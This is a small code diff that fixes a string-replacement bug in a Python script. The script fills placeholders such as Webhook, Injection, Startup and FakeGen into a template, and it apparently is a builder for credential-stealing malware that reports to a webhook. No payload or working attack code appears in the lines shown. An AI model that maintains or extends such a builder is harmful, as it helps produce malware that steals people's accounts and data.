@@ -198,7 +198,7 @@ while True:
     new_content = content.replace("'%Webhook%'", f'{str(Webhook)}' + ',' + f'{str(custom_key)}')
     new_content = new_content.replace("'%Debug%'", str(Debug))
     new_content = new_content.replace("'%FakeWebhook%'", str(FakeWeb))
-    new_content = new_content.replace("'%FakeWebhook%'", str(Schedule))
+    new_content = new_content.replace("'%Schedule%'", str(Schedule))
     new_content = new_content.replace("'%FakeGen%'", str(FakeGen))
     new_content = new_content.replace("'%Injection%'", str(Injection))
     new_content = new_content.replace("'%Startup%'", str(Startup))
